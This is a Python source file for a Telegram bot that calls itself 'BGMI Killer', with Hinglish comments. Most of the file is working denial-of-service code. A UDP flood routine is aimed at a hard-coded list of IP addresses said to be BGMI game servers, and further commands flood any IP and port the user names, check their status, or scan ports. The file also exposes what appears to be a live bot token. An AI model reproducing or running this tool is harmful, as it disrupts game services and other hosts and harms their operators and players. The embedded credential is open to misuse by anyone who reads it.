import os
import sqlite3
import asyncio
import logging
import threading
import socket
import random
import time
import requests
import subprocess
from datetime import datetime
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
# Bhai maine aapka token aur ID yahan fix kar di hai
BOT_TOKEN = "8735434023:AAFyHYvRVuK_XajrwAQdMjR5XyZ3C8-BWDU"
ADMIN_ID = 6241594867 

BGMI_SERVERS = [
    ('103.21.244.50', 3074), ('103.21.244.50', 7777),
    ('103.21.244.51', 3074), ('103.21.244.51', 7777),
    ('103.21.245.20', 3074), ('103.21.245.20', 7777),
    ('103.21.245.21', 3074), ('103.21.245.21', 7777),
    ('152.67.40.20', 3074), ('152.67.40.20', 7777),
    ('152.67.40.21', 3074), ('152.67.40.21', 7777)
]
MAX_CONCURRENT = 5
DB_FILE = 'bgmi_killer.db'

# Logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# SQLite Setup
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS attacks 
                 (id INTEGER PRIMARY KEY, user_id INTEGER, target TEXT, 
                  method TEXT, duration INTEGER, start_time TEXT, status TEXT)''')
    conn.commit()
    conn.close()

def log_attack(user_id, target, method, duration):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO attacks (user_id, target, method, duration, start_time, status) VALUES (?, ?, ?, ?, ?, ?)",
              (user_id, target, method, duration, datetime.now().isoformat(), 'running'))
    conn.commit()
    conn.close()

# Self-protection
def is_self_attack(target_ip):
    self_ips = ['127.0.0.1', 'localhost', '0.0.0.0', '::1']
    if target_ip in self_ips:
        return True
    return False

# Attack Manager
class AttackManager:
    def __init__(self):
        self.active_attacks = 0
        self.lock = threading.Lock()
    
    def can_start(self):
        with self.lock:
            return self.active_attacks < MAX_CONCURRENT
    
    def start_attack(self, target_ip, target_port, duration):
        if not self.can_start():
            return False
        with self.lock:
            self.active_attacks += 1
        
        # Bhai, agar aapke paas 'bgmi' binary hai, toh niche wali line ko uncomment kar dena
        # threading.Thread(target=self.binary_attack, args=(target_ip, target_port, duration)).start()
        
        # Abhi ke liye original UDP flood hi rehne diya hai
        thread = threading.Thread(target=self.udp_flood, args=(target_ip, target_port, duration))
        thread.daemon = True
        thread.start()
        return True
    
    def udp_flood(self, ip, port, duration):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes_to_send = random._urandom(1024) # Balanced packet size for AWS
            end_time = time.time() + duration
            while time.time() < end_time:
                sock.sendto(bytes_to_send, (ip, port))
        except: pass
        finally:
            with self.lock:
                self.active_attacks -= 1

attack_manager = AttackManager()

# --- HANDLERS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text('🕹️ **BGMI Killer AWS Bot Active!**\n\n/matchkill - Kill 100-player match\n/scan - Check server status\n/attack <ip:port> <time>\n/status - Check running attacks')

async def matchkill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text('❌ Not Authorized!')
        return
    
    await update.message.reply_text('🔥🌊 **Matchkill initiated!** Flooding main BGMI servers...')
    log_attack(update.effective_user.id, 'BGMI_MATCH', 'UDP_FLOOD', 300)
    
    for ip, port in BGMI_SERVERS[:MAX_CONCURRENT]:
        attack_manager.start_attack(ip, port, 300)
    
    await update.message.reply_text('💥 **Matchkill Deployed!** Server ping should spike now.')

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = "🔍 **BGMI Server Status:**\n"
    await update.message.reply_text("Scanning... please wait.")
    for ip, port in BGMI_SERVERS[:5]: # Scanning first 5 for speed
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        status = '🟢 OPEN' if result == 0 else '🔴 CLOSED'
        msg += f"`{ip}:{port}` - {status}\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        ip_port, duration = context.args[0], int(context.args[1])
        ip, port = ip_port.split(':')
        if attack_manager.start_attack(ip, int(port), duration):
            await update.message.reply_text(f'⚡🗡🔫 Attack sent to `{ip}:{port}` for `{duration}s`')
        else:
            await update.message.reply_text('⏳ System busy! Max attacks reached.')
    except:
        await update.message.reply_text('Usage: /attack <ip> <port> <time>')

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f'📊 **System Status**\nActive Attacks: {attack_manager.active_attacks}/{MAX_CONCURRENT}')

def main():
    init_db()
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("matchkill", matchkill))
    application.add_handler(CommandHandler("scan", scan))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("status", status))
    
    print("✅ RAILWAY Bot is running...")
    application.run_polling()

if __name__ == '__main__':
    main()
